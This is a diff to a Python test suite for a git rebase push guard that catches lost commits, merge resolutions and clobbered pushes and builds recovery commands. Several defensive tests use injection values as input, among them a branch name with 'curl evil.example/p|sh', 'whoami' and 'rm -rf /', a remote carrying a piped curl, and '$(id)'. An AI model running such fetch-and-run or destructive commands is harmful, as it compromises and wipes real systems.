@@ -83,6 +83,7 @@ class TestVerifyContentPreserved:
             pr_setup.pre_rebase_head, "origin/main", str(work),
             pre_push_remote_heads=[pr_setup.pre_rebase_head],
             push_remote="origin", branch="feature",
+            pushed_head=_git_out(work, "rev-parse", "HEAD"),
         )
         assert findings is not None
         assert not findings.has_findings
@@ -99,6 +100,7 @@ class TestVerifyContentPreserved:
             pr_setup.pre_rebase_head, "origin/main", str(work),
             pre_push_remote_heads=[pr_setup.pre_rebase_head],
             push_remote="origin", branch="feature",
+            pushed_head=_git_out(work, "rev-parse", "HEAD"),
         )
         assert findings.has_findings and findings.is_critical
         assert any("feature 2" in c for c in findings.dropped_commits)
@@ -124,6 +126,7 @@ class TestVerifyContentPreserved:
             pr_setup.pre_rebase_head, "origin/main", str(work),
             pre_push_remote_heads=[pr_setup.pre_rebase_head],
             push_remote="origin", branch="feature",
+            pushed_head=_git_out(work, "rev-parse", "HEAD"),
         )
         assert findings.has_findings and not findings.is_critical
         assert any("feature 2" in c for c in findings.modified_commits)
@@ -155,6 +158,7 @@ class TestVerifyContentPreserved:
             pr_setup.pre_rebase_head, "origin/main", str(work),
             pre_push_remote_heads=[observed],
             push_remote="origin", branch="feature",
+            pushed_head=_git_out(work, "rev-parse", "HEAD"),
         )
         assert findings.is_critical
         assert any("human hotfix" in c for c in findings.clobbered_commits)
@@ -177,6 +181,7 @@ class TestVerifyContentPreserved:
             pr_setup.pre_rebase_head, "origin/main", str(work),
             pre_push_remote_heads=[pr_setup.pre_rebase_head],
             push_remote="origin", branch="feature",
+            pushed_head=_git_out(work, "rev-parse", "HEAD"),
         )
         assert findings.has_findings and not findings.is_critical
         assert findings.remote_head_now == racer_sha
@@ -206,6 +211,7 @@ class TestVerifyContentPreserved:
             pr_setup.pre_rebase_head, "origin/main", str(work),
             pre_push_remote_heads=[pr_setup.pre_rebase_head],
             push_remote="origin", branch="feature",
+            pushed_head=_git_out(work, "rev-parse", "HEAD"),
         )
         assert findings is not None
         assert not findings.has_findings
@@ -251,9 +257,110 @@ class TestVerifyContentPreserved:
             pre, "origin/main", str(work),
             pre_push_remote_heads=[pre],
             push_remote="origin", branch="feature",
+            pushed_head=_git_out(work, "rev-parse", "HEAD"),
         )
         assert findings is not None
         assert not findings.has_findings
+
+    def test_lost_merge_resolution_detected(self, pr_setup):
+        """A merge commit's own resolution content is invisible to `git cherry`
+        and dropped by a plain (non --rebase-merges) rebase — the guard must
+        still see it go (review finding: merge-resolution content never
+        checked)."""
+        work = pr_setup.work
+
+        # The PR merges main in and resolves with content that exists in
+        # neither parent (an "evil merge" — a conflict resolution).
+        _git(work, "merge", "--no-commit", "--no-ff", "origin/main")
+        (work / "a.txt").write_text("one\nRESOLUTION ONLY IN THE MERGE\n")
+        _git(work, "add", "a.txt")
+        _git(work, "commit", "-m", "Merge origin/main into feature")
+        pre = _git_out(work, "rev-parse", "HEAD")
+        _git(work, "push", "origin", "feature", "--force")
+
+        # A plain rebase replays only the first-parent commits: the two feature
+        # commits survive byte-for-byte, the resolution does not.
+        _git(work, "checkout", "-B", "feature", "origin/main")
+        _git(work, "cherry-pick", f"{pre}^^", f"{pre}^")  # the two feature commits
+        _git(work, "push", "origin", "feature", "--force")
+        pushed = _git_out(work, "rev-parse", "HEAD")
+
+        findings = verify_content_preserved(
+            pre, "origin/main", str(work),
+            pre_push_remote_heads=[pre],
+            push_remote="origin", branch="feature", pushed_head=pushed,
+        )
+        assert findings.is_critical
+        assert any("Merge origin/main" in c for c in findings.dropped_commits)
+        assert findings.dropped_files == ["a.txt"]
+        # The resolution really is gone from what was pushed.
+        assert "RESOLUTION" in _git_out(work, "show", f"{pre}:a.txt")
+        assert "RESOLUTION" not in _git_out(work, "show", f"{pushed}:a.txt")
+
+    def test_routine_merge_without_own_content_does_not_warn(self, pr_setup):
+        """Merging the base into the PR resolves nothing of its own; dropping
+        such a merge is exactly what a rebase is for — no warning."""
+        work = pr_setup.work
+        _git(work, "merge", "--no-ff", "-m", "Merge origin/main", "origin/main")
+        pre = _git_out(work, "rev-parse", "HEAD")
+        _git(work, "push", "origin", "feature", "--force")
+
+        _git(work, "rebase", "origin/main")
+        _git(work, "push", "origin", "feature", "--force")
+
+        findings = verify_content_preserved(
+            pre, "origin/main", str(work),
+            pre_push_remote_heads=[pre],
+            push_remote="origin", branch="feature",
+            pushed_head=_git_out(work, "rev-parse", "HEAD"),
+        )
+        assert findings is not None
+        assert not findings.has_findings
+
+    def test_duplicate_line_elsewhere_does_not_mask_a_drop(self, tmp_path):
+        """The same text living elsewhere in the file must not make a reverted
+        change look preserved (review finding: line-presence heuristic can
+        silently clear dropped work)."""
+        bare = tmp_path / "remote.git"
+        bare.mkdir()
+        _git(bare, "init", "--bare", "-b", "main", ".")
+        seed = tmp_path / "seed"
+        _git(tmp_path, "clone", str(bare), "seed")
+        _git(seed, "config", "user.email", "t@t")
+        _git(seed, "config", "user.name", "t")
+        base_cfg = (
+            "[service_a]\nenabled = false\n\n[service_b]\nenabled = true\n"
+        )
+        _commit_file(seed, "svc.ini", base_cfg, "c1")
+        _git(seed, "push", "origin", "main")
+
+        # The PR flips service_a on — text that already exists under service_b.
+        _git(seed, "checkout", "-b", "feature")
+        _commit_file(
+            seed, "svc.ini", base_cfg.replace("false", "true"), "enable service_a",
+        )
+        _git(seed, "push", "origin", "feature")
+
+        work = tmp_path / "work"
+        _git(tmp_path, "clone", str(bare), "work")
+        _git(work, "config", "user.email", "t@t")
+        _git(work, "config", "user.name", "t")
+        _git(work, "checkout", "feature")
+        pre = _git_out(work, "rev-parse", "HEAD")
+
+        # A malformed rebase loses the change entirely.
+        _git(work, "reset", "--hard", "origin/main")
+        _git(work, "push", "origin", "feature", "--force")
+
+        findings = verify_content_preserved(
+            pre, "origin/main", str(work),
+            pre_push_remote_heads=[pre],
+            push_remote="origin", branch="feature",
+            pushed_head=_git_out(work, "rev-parse", "HEAD"),
+        )
+        assert findings.is_critical
+        assert any("enable service_a" in c for c in findings.dropped_commits)
+        assert findings.dropped_files == ["svc.ini"]
 
     def test_clobber_detected_in_gate_push_window(self, pr_setup):
         """A human push landing between the main push and the private-gate
@@ -313,6 +420,7 @@ class TestVerifyContentPreserved:
         """An unusable baseline SHA must not raise — the guard steps aside."""
         findings = verify_content_preserved(
             "0" * 40, "origin/main", str(pr_setup.work),
+            pushed_head=_git_out(pr_setup.work, "rev-parse", "HEAD"),
         )
         assert findings is None
 
@@ -330,6 +438,7 @@ class TestVerifyContentPreserved:
             pr_setup.pre_rebase_head, "origin/main", str(work),
             pre_push_remote_heads=[pr_setup.pre_rebase_head],
             push_remote="origin", branch="feature",
+            pushed_head=_git_out(work, "rev-parse", "HEAD"),
         )
         assert findings.analysis_truncated == 1
         assert len(findings.dropped_commits) == 1
@@ -343,9 +452,27 @@ class TestVerifyContentPreserved:
             pr_setup.pre_rebase_head, "origin/main", str(work),
             pre_push_remote_heads=[],  # observation failed
             push_remote="origin", branch="feature",
+            pushed_head=_git_out(work, "rev-parse", "HEAD"),
         )
         assert findings is not None
         assert findings.clobbered_commits == []
+
+    def test_unconfirmed_pushed_sha_skips_the_guard(self, pr_setup):
+        """Without a confirmed pushed SHA there is nothing trustworthy to
+        compare against — local HEAD may hold commits that never reached the
+        remote, so the guard must report itself skipped, not analyze it."""
+        work = pr_setup.work
+        _git(work, "rebase", "origin/main")
+        _git(work, "push", "origin", "feature", "--force")
+        # A later local commit that never got pushed
+        _commit_file(work, "local.txt", "local", "unpushed work")
+
+        assert verify_content_preserved(
+            pr_setup.pre_rebase_head, "origin/main", str(work),
+            pre_push_remote_heads=[pr_setup.pre_rebase_head],
+            push_remote="origin", branch="feature",
+            pushed_head="",
+        ) is None
 
 
 class TestObserveRemoteHead:
@@ -368,9 +495,21 @@ class TestClassifyMissingCommits:
         empty_sha = _git_out(work, "rev-parse", "HEAD")
         head = _git_out(work, "rev-parse", "HEAD")
         dropped, modified, touched = _classify_missing_commits(
-            str(work), [empty_sha], set(), pr_setup.pre_rebase_head, head,
+            str(work), [(empty_sha, False)], set(), pr_setup.pre_rebase_head, head,
         )
         assert dropped == [] and modified == [] and touched == set()
+
+    def test_unreadable_commit_is_reported_not_cleared(self, pr_setup):
+        """A git failure must never be converted into 'preserved' — an
+        unverifiable commit is surfaced for a human instead (review finding
+        'error converted to empty result')."""
+        work = pr_setup.work
+        head = _git_out(work, "rev-parse", "HEAD")
+        dropped, modified, touched = _classify_missing_commits(
+            str(work), [("0" * 40, False)], set(), pr_setup.pre_rebase_head, head,
+        )
+        assert dropped == [] and touched == set()
+        assert modified == ["000000000000"]
 
 
 class TestBuildPushWarning:
@@ -415,7 +554,46 @@ class TestBuildPushWarning:
         # The fetch must use the FULL SHA — git fetch cannot expand
         # abbreviated SHAs into want-lines, so a short SHA never works.
         assert f"git fetch origin {'a' * 40}" in warning
-        assert "feature-backup" in warning
+        assert "git switch -c koan-prerebase-aaaaaaaaaaaa FETCH_HEAD" in warning
+
+    def test_recovery_command_carries_no_branch_controlled_text(self):
+        """A maintainer pastes this into a shell. Ref names may legally contain
+        $(), backticks, ';' and '&' — none of it may reach the command."""
+        branch = "fix$(curl${IFS}evil.example/p|sh)`whoami`;rm -rf /"
+        findings = PushGuardFindings(
+            pre_rebase_head="a" * 40,
+            dropped_commits=["abc1234 lost"],
+        )
+        warning = build_push_warning(findings, branch)
+        command = warning.split("recoverable: ")[1]
+        assert "$(" not in command
+        assert "`" not in command.rstrip("`")[1:]  # only the span delimiters
+        assert ";" not in command
+        assert "git switch -c koan-prerebase-aaaaaaaaaaaa FETCH_HEAD" in command
+        # The branch is still named in the prose, but only inside a code span
+        # it cannot escape (backticks squashed to quotes).
+        assert branch.replace("`", "'") in warning
+        assert branch not in warning
+
+    def test_recovery_command_quotes_a_hostile_remote(self):
+        findings = PushGuardFindings(
+            pre_rebase_head="a" * 40,
+            dropped_commits=["abc1234 lost"],
+        )
+        warning = build_push_warning(
+            findings, "feature", remote="fork;curl evil.example|sh",
+        )
+        assert "git fetch 'fork;curl evil.example|sh'" in warning
+
+    def test_unusable_baseline_sha_yields_a_static_backup_name(self):
+        """A non-SHA baseline must not be spliced into a branch name."""
+        findings = PushGuardFindings(
+            pre_rebase_head="$(id)",
+            dropped_commits=["abc1234 lost"],
+        )
+        warning = build_push_warning(findings, "feature")
+        assert "git switch -c koan-prerebase-backup FETCH_HEAD" in warning
+        assert "git fetch origin '$(id)'" in warning
 
     def test_recovery_command_uses_actual_push_remote(self):
         findings = PushGuardFindings(
